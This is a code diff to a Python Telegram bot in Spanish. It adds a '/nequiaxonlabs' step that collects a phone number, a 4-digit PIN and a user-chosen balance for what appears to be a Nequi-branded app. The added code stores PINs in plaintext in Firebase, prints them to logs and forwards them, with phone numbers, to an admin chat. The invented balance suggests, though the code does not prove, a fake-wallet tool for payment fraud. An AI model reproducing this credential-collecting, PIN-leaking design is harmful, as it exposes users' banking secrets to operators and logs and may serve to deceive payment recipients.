@@ -52,6 +52,7 @@ enlaces_vip_personales = {}
 
 # Conversation states
 USERNAME_STEP = 0
+COMPLETE_ACCOUNT_STEP = 1
 NUEVO_PHONE, NUEVO_PIN, NUEVO_SALDO = range(10, 13)
 user_data = {}
 admin_nuevo_data = {}
@@ -885,6 +886,8 @@ async def get_username_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.message.text.strip().replace('@', '').lower()
     
+    print(f"📝 get_username_step - Usuario: {user_id}, Username: {username}")
+    
     if len(username) < 3:
         await update.message.reply_text("❌ Username muy corto. Mínimo 3 caracteres.\nIntenta de nuevo:")
         return USERNAME_STEP
@@ -904,7 +907,10 @@ async def get_username_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
             'active': True
         })
     
+    # Guardar en user_data
     user_data[user_id]['telegram_username'] = username
+    
+    print(f"✅ Username guardado - user_data[{user_id}]: {user_data[user_id]}")
     
     await update.message.reply_text(
         f"✅ Arroba: <b>@{username}</b>\n\n"
@@ -916,6 +922,113 @@ async def get_username_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚠️ Número: 10 dígitos | PIN: 4 dígitos",
         parse_mode='HTML'
     )
+    
+    # NO terminar el handler, esperar el comando /nequiaxonlabs
+    return COMPLETE_ACCOUNT_STEP
+
+async def complete_account_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Maneja el comando /nequiaxonlabs dentro del ConversationHandler"""
+    user_id = update.effective_user.id
+    
+    print(f"🔍 complete_account_step - Usuario: {user_id}")
+    print(f"🔍 user_data: {user_data.get(user_id, 'NO EXISTE')}")
+    
+    # Verificar que sea el comando correcto
+    if not update.message.text.startswith('/nequiaxonlabs'):
+        await update.message.reply_text(
+            "❌ <b>COMANDO INCORRECTO</b>\n\n"
+            "Debes usar el comando:\n"
+            "<code>/nequiaxonlabs numero pin saldo</code>\n\n"
+            "📌 Ejemplo:\n"
+            "<code>/nequiaxonlabs 3001234567 0515 500000</code>",
+            parse_mode='HTML'
+        )
+        return COMPLETE_ACCOUNT_STEP
+    
+    # Extraer argumentos del comando
+    parts = update.message.text.split()
+    
+    if len(parts) != 4:  # /nequiaxonlabs + 3 argumentos
+        await update.message.reply_text(
+            "❌ <b>FORMATO INCORRECTO</b>\n\n"
+            "Usa: <code>/nequiaxonlabs numero pin saldo</code>\n\n"
+            "📌 Ejemplo:\n"
+            "<code>/nequiaxonlabs 3001234567 0515 500000</code>\n\n"
+            "⚠️ Número: 10 dígitos | PIN: 4 dígitos | Saldo: solo números",
+            parse_mode='HTML'
+        )
+        return COMPLETE_ACCOUNT_STEP
+    
+    phone = parts[1].strip()
+    pin = parts[2].strip()
+    saldo_text = parts[3].strip().replace('.', '').replace(',', '')
+    
+    print(f"📱 Usuario {user_id} - Phone: {phone}, PIN: {pin}, Saldo: {saldo_text}")
+    
+    if not phone.isdigit() or len(phone) != 10:
+        await update.message.reply_text("❌ Número inválido. Debe tener 10 dígitos.")
+        return COMPLETE_ACCOUNT_STEP
+    
+    if not pin.isdigit() or len(pin) != 4:
+        await update.message.reply_text("❌ PIN inválido. Debe tener 4 dígitos.")
+        return COMPLETE_ACCOUNT_STEP
+    
+    if not saldo_text.isdigit():
+        await update.message.reply_text("❌ Saldo inválido. Solo números.")
+        return COMPLETE_ACCOUNT_STEP
+    
+    username = user_data[user_id]['telegram_username']
+    saldo = int(saldo_text)
+    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    print(f"✅ Usuario {user_id} - Guardando cuenta: {username}, {phone}")
+    
+    if db:
+        try:
+            # Guardar en la colección 'users' con el NÚMERO como ID
+            db.collection('users').document(phone).set({
+                'name': username,
+                'pin': str(pin),
+                'saldo': str(saldo),
+                'isActive': True,
+                'created_by': user_id,
+                'created_at': created_at
+            })
+            print(f"✅ Usuario {user_id} - Cuenta guardada en Firebase")
+        except Exception as e:
+            print(f"❌ Firebase error: {e}")
+            await update.message.reply_text("❌ Error al guardar. Intenta de nuevo.")
+            return COMPLETE_ACCOUNT_STEP
+    
+    admin_message = f"""
+🆕 <b>NUEVA CUENTA CREADA</b>
+
+👤 <b>Username:</b> @{username}
+📱 <b>Teléfono:</b> {phone}
+🔐 <b>PIN:</b> {pin}
+💰 <b>Saldo:</b> ${saldo:,}
+🆔 <b>Telegram ID:</b> {user_id}
+🕐 <b>Fecha:</b> {created_at}
+"""
+    send_telegram_message(admin_message, ADMIN_PRINCIPAL_1)
+    
+    await update.message.reply_text(
+        f"✅ <b>¡CUENTA CREADA EXITOSAMENTE!</b>\n\n"
+        f"👤 Username: <b>@{username}</b>\n"
+        f"📱 Teléfono: <code>{phone}</code>\n"
+        f"🔐 PIN: <code>{pin}</code>\n"
+        f"💰 Saldo: ${saldo:,}\n\n"
+        f"🎉 Tu cuenta está lista para usar.\n"
+        f"Ingresa a la app con tu username: <code>{username}</code>",
+        parse_mode='HTML'
+    )
+    
+    print(f"✅ Usuario {user_id} - Proceso completado")
+    
+    # Limpiar user_data
+    if user_id in user_data:
+        del user_data[user_id]
+    
     return ConversationHandler.END
 
 async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2437,6 +2550,7 @@ def main():
         entry_points=[CommandHandler('crear', crear_start)],
         states={
             USERNAME_STEP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username_step)],
+            COMPLETE_ACCOUNT_STEP: [MessageHandler(filters.TEXT, complete_account_step)],
         },
         fallbacks=[CommandHandler('cancelar', cancel)],
     )
